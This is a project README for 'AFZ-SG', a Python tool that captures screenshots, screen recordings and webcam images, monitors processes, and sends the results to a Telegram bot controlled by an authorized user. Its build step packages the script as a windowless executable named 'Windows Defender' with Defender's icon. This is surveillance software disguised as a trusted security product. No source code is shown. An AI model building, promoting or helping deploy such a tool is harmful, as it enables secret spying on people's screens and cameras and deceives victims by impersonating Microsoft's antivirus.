# Windows Defender - Python Project

<div align="center">
  <h1>AFZ-SG</h1>
</div>

<div align="center">
  <h2>A Python-based utility for monitoring system activities with added functionalities!</h2>
</div>

---

## 📜 About the Project
This project is a Python-based utility mimicking some features of Windows Defender. It includes system activity monitoring, notification services, and interaction with system files, leveraging the power of several Python libraries.

### Features:
- **Screenshot & Screen Recording:** Captures screenshots or records activities.
- **Notifications:** Sends desktop notifications for various events.
- **Process Monitoring:** Monitors active processes and gathers details.
- **Camera Interaction:** Captures images using the system's camera.
- **Telegram Bot Integration:** Communicates results via Telegram.

---

## 🛠️ Built With
- Python
- Libraries:
  - [Telebot](https://github.com/eternnoir/pyTelegramBotAPI)
  - [OpenCV](https://opencv.org/)
  - [Pillow](https://python-pillow.org/)
  - [Win10Toast](https://pypi.org/project/win10toast/)
  - [Plyer](https://pypi.org/project/plyer/)
  - [PyWin32](https://github.com/mhammond/pywin32)
  - [Psutil](https://github.com/giampaolo/psutil)

---

## 🚀 Installation

### Prerequisites
Make sure Python is installed on your system. You can download it from [python.org](https://www.python.org/).

### Steps
1. Clone the repository:
   ```bash
   git clone https://github.com/aliasgharfathikhah/afz-sg.git
   cd afz-sg
   ```

2. Install required packages:
   ```bash
   pip install -r requirements.txt
   ```

3. Run the project:
   ```bash
   python afz_sg.py
   ```

4. Create a standalone executable (Optional):
   ```bash
   pyinstaller --noconsole --onefile --icon=windows-defender.ico --name="Windows Defender" afz_sg.py
   ```

---

## 📂 Project Structure
```
.
├── afz_sg.py                    # Main script file
├── requirements.txt        # List of dependencies
├── windows-defender.ico    # Icon file for the application
└── README.md               # Project documentation
```

## 🤝 Contributing
Contributions are welcome! Follow these steps to contribute:
1. Fork the project.
2. Create your feature branch (`git checkout -b feature/YourFeature`).
3. Commit your changes (`git commit -m 'Add some feature'`).
4. Push to the branch (`git push origin feature/YourFeature`).
5. Open a pull request.

---

## 📝 License
This project is licensed under the [MIT License](LICENSE).

> **Note:** The `CHAT_ID` field in the `settings.txt` file does not require manual input. When the application receives a message through the Telegram bot, it automatically detects and fills the `CHAT_ID` field with the appropriate value. Users only need to configure other settings like `BOT_TOKEN` and `AUTHORIZED_USERNAME`.

